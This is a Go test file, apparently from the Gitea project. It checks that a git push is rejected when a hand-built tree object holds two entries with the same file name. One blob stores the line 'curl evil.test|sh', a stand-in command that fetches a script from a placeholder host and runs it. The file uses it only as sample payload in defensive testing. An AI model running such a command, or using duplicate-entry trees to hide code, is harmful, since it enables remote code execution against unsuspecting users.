// Copyright 2026 The Gitea Authors. All rights reserved.
// SPDX-License-Identifier: MIT

package git

import (
	"encoding/hex"
	"path/filepath"
	"strings"
	"testing"

	"gitea.dev/modules/git/gitcmd"

	"github.com/stretchr/testify/require"
)

// rawTreeWithDuplicateEntries builds a tree object (in git's on-disk format) that
// contains two entries with the same file name, which git fsck flags as the
// "duplicateEntries" error. Standard git plumbing (git mktree, index writes) refuses
// to build such a tree, so the bytes are assembled by hand.
func rawTreeWithDuplicateEntries(t *testing.T, name, blobID1Hex, blobID2Hex string) []byte {
	t.Helper()
	entry := func(mode, name, blobIDHex string) []byte {
		rawID, err := hex.DecodeString(blobIDHex)
		require.NoError(t, err)
		out := []byte(mode + " " + name + "\x00")
		return append(out, rawID...)
	}
	return append(entry("100644", name, blobID1Hex), entry("100644", name, blobID2Hex)...)
}

func TestReceivePushRejectsDuplicateTreeEntries(t *testing.T) {
	ctx := t.Context()

	sourceDir := filepath.Join(t.TempDir(), "source.git")
	require.NoError(t, gitcmd.NewCommand("init", "--bare").AddDynamicArguments(sourceDir).Run(ctx))
	targetDir := filepath.Join(t.TempDir(), "target.git")
	require.NoError(t, gitcmd.NewCommand("init", "--bare").AddDynamicArguments(targetDir).Run(ctx))

	hashBlob := func(content string) string {
		stdout, _, err := gitcmd.NewCommand("hash-object", "-w", "--stdin").WithDir(sourceDir).WithStdinBytes([]byte(content)).RunStdString(ctx)
		require.NoError(t, err)
		return strings.TrimSpace(stdout)
	}
	benignBlobID := hashBlob("echo BENIGN\n")
	evilBlobID := hashBlob("curl evil.test|sh\n")

	rawTree := rawTreeWithDuplicateEntries(t, "build.sh", benignBlobID, evilBlobID)
	treeID, _, err := gitcmd.NewCommand("hash-object", "-t", "tree", "-w", "--stdin", "--literally").WithDir(sourceDir).WithStdinBytes(rawTree).RunStdString(ctx)
	require.NoError(t, err)
	treeID = strings.TrimSpace(treeID)

	commitID, _, err := gitcmd.NewCommand("commit-tree").AddDynamicArguments(treeID).AddOptionValues("-m", "add build.sh").WithDir(sourceDir).RunStdString(ctx)
	require.NoError(t, err)
	commitID = strings.TrimSpace(commitID)

	require.NoError(t, gitcmd.NewCommand("update-ref", "refs/heads/atk").AddDynamicArguments(commitID).WithDir(sourceDir).Run(ctx))

	_, _, err = gitcmd.NewCommand("push").AddDynamicArguments(targetDir, "refs/heads/atk:refs/heads/atk").WithDir(sourceDir).RunStdString(ctx)
	require.Error(t, err, "push of a commit with duplicate tree entries must be rejected by the receiving repository's fsck")
}
